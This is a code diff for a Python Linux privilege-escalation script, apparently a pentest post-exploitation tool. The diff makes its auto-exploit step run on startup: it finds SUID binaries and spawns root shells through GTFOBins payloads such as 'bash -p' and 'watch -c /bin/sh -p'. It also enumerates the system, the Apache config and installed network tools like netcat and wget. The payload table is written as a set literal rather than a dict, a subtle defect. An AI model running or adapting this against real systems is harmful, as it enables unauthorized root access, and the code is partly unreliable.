@@ -37,20 +37,6 @@ class Command:
 
 
 class AutoExploit:
-    uid_bins = [  # These binaries are usually found with SUID in Unix systems
-    "arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh",
-    "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4",
-    "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic",
-    "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs",
-    "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping",
-    "ping6", "pkexec", "polkit-agent-helper-1", "pppd",
-    "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils",
-    "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl",
-    "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM",
-    "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug",
-    "vmware-vmx-stats", "Xorg.wrap",
-    ]
-
     gtfobins_payloads = {
         'ash', Command(command='ash', comment='run ash'),
         'bash', Command(command='bash -p', comment='run bash'),
@@ -112,19 +98,24 @@ class AutoExploit:
         'watch', Command(command='watch -c /bin/sh -p', comment='run watch as root'),
     }
 
-    def attempt_autoexploit(self):
+    def run(self):
         command = "find / -perm -4000 -type f 2>/dev/null"
         suids = os.popen(command).read().strip().split("\n")
 
         for suid in suids:
             sname = suid.split("/")[::-1][0]
+            print(f'\t{Color.YELLOW}SUID binary:{sname}{Color.RESET_ALL}')
             if sname in self.gtfobins_payloads:
-                self.gtfobins_payloads[sname].run()
+                self.gtfobins_payloads[sname].popen() # type: ignore
 
 
 #################################
 ######### ENUMERATION ###########
 #################################
+
+print(f'{Color.YELLOW}[*] Attempting auto-exploit{Color.RESET_ALL}')
+AutoExploit().run()
+
 
 print(f'{Color.YELLOW}[*] System Info{Color.RESET_ALL}')
 Command("hostnamectl | grep 'Operating System | cut -d : -f 2'", "Operating System").run()
@@ -188,4 +179,6 @@ Command("cat /etc/apache2/apache2.conf 2>/dev/null", "Apache config").run()
 print(f'\n{Color.YELLOW}[*] Other priv-esc vectors{Color.RESET_ALL}')
 Command("which awk perl python ruby gcc cc vi vim nmap find netcat nc wget \
         tftp ftp 2>/dev/null", "local installed exploit tools").run()
+
+
 
